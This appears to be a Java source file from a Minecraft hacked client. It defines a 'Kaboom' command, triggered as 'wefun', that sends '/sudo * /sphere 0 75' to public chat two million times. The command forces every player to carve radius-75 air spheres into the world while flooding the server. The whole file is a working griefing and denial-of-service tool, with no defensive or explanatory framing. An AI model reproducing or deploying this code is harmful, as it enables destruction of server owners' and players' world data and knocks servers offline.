package me.deepcraft.commands.list;

import me.deepcraft.commands.Command;
import me.deepcraft.utils.ChatUtil;

public class KaboomCommand extends Command {

    public KaboomCommand() {
        super("wefun");
    }

    @Override
    public void execute(String[] args) {
        ChatUtil.clientMessage("§adestroying thread...");
        for (int i = 0; i < 2000000; i++) {
            ChatUtil.publicMessage("/sudo * /sphere 0 75");


        }
    }
}
